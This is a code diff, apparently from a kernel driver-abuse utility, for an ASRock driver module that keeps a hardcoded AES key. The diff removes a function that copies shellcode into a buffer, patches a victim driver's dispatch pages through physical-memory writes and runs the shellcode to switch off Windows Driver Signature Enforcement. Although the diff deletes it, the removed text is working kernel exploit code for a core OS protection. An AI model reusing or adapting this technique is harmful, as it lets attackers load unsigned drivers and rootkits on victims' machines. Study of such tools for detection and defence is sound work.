@@ -27,12 +27,6 @@
 #define ASROCK_AES_KEY          "C110DD4FE9434147B92A5A1E3FDBF29A"
 #define ASROCK_AES_KEY_LENGTH   sizeof(ASROCK_AES_KEY) - sizeof(CHAR)
 
-#ifdef __cplusplus
-extern "C" {
-    void BaseShellDSEFix();
-    void BaseShellDSEFixEnd();
-}
-#endif
 
 /*
 * AsrEncryptDriverRequest
@@ -130,7 +124,6 @@ BOOL AsrEncryptDriverRequest(
             }
 
         }
-
 
     } while (FALSE);
 
@@ -273,105 +266,4 @@ BOOL WINAPI AsrWritePhysicalMemory(
     return AsrCallDriver(DeviceHandle,
         IOCTL_ASRDRV_WRITE_MEMORY,
         &args);
-}
-
-/*
-* AsrControlDSE
-*
-* Purpose:
-*
-* Change Windows CodeIntegrity flags state via ASRock driver.
-*
-*/
-BOOL AsrControlDSE(
-    _In_ PKDU_CONTEXT Context,
-    _In_ ULONG DSEValue,
-    _In_ ULONG_PTR Address
-)
-{
-    BOOL bResult = FALSE;
-    unsigned char shellBuffer[200];
-    SIZE_T shellSize = (ULONG_PTR)BaseShellDSEFixEnd - (ULONG_PTR)BaseShellDSEFix;
-
-    KDU_PROVIDER* prov;
-    KDU_VICTIM_PROVIDER* victimProv;
-    HANDLE victimDeviceHandle = NULL;
-
-    KDU_PHYSMEM_ENUM_PARAMS enumParams;
-
-    prov = Context->Provider;
-    victimProv = Context->Victim;
-
-    RtlFillMemory(shellBuffer, sizeof(shellBuffer), 0xCC);
-    RtlCopyMemory(shellBuffer, BaseShellDSEFix, shellSize);
-
-    *(PULONG_PTR)&shellBuffer[0x2] = Address;
-    *(PULONG_PTR)&shellBuffer[0xC] = DSEValue;
-
-
-    if (shellSize > sizeof(shellBuffer)) {
-        supPrintfEvent(kduEventError,
-            "[!] Patch code size 0x%llX exceeds limit 0x%llX, abort\r\n", shellSize, sizeof(shellBuffer));
-
-        return FALSE;
-    }
-
-    //
-    // Load/open victim.
-    //
-    if (VpCreate(victimProv,
-        Context->ModuleBase,
-        &victimDeviceHandle))
-    {
-        printf_s("[+] Victim is accepted, handle 0x%p\r\n", victimDeviceHandle);
-    }
-    else {
-
-        supPrintfEvent(kduEventError,
-            "[!] Error preloading victim driver, abort\r\n");
-
-        return FALSE;
-    }
-
-    enumParams.bWrite = TRUE;
-    enumParams.cbPagesFound = 0;
-    enumParams.cbPagesModified = 0;
-    enumParams.Context = Context;
-    enumParams.pvPayload = shellBuffer;
-    enumParams.cbPayload = (ULONG)shellSize;
-
-    supPrintfEvent(kduEventInformation,
-        "[+] Looking for %ws driver dispatch memory pages, please wait\r\n", victimProv->Name);
-
-    if (supEnumeratePhysicalMemory(KDUProcExpPagePatchCallback, &enumParams)) {
-
-        printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
-            enumParams.cbPagesFound,
-            enumParams.cbPagesModified);
-
-        //
-        // Run shellcode.
-        //
-        VpExecutePayload(victimProv, &victimDeviceHandle);
-
-        supPrintfEvent(kduEventInformation,
-            "[+] DSE patch executed successfully\r\n");
-    }
-
-    //
-    // Ensure victim handle is closed.
-    //
-    if (victimDeviceHandle) {
-        NtClose(victimDeviceHandle);
-        victimDeviceHandle = NULL;
-    }
-
-    //
-    // Cleanup.
-    //
-    if (VpRelease(victimProv, &victimDeviceHandle)) {
-        printf_s("[+] Victim released\r\n");
-    }
-
-    return bResult;
 }
